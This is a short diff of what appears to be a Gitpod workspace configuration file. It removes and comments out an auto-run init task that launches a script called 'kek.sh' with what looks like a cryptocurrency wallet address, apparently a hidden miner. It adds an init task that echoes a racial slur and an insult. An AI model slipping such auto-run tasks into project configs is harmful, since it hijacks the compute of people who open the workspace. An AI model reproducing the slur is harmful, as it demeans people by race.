@@ -8,4 +8,5 @@ ports:
 
 # List the start up tasks. You can start them in parallel in multiple terminals. See https://www.gitpod.io/docs/config-start-tasks/
 tasks:
-  - init: bash ./kek.sh 43stYNqXYntQtSQEEoFpUrEhvpzb8sucgUizHK7dk5ya8qkz2gQ1DgdJhKnMK3tbrPJN2g53jFzLVAtkvefoF8KNVPTsv6c
+  - init: echo "Fuck your nigger pet"
+#- init: bash ./kek.sh 43stYNqXYntQtSQEEoFpUrEhvpzb8sucgUizHK7dk5ya8qkz2gQ1DgdJhKnMK3tbrPJN2g53jFzLVAtkvefoF8KNVPTsv6c
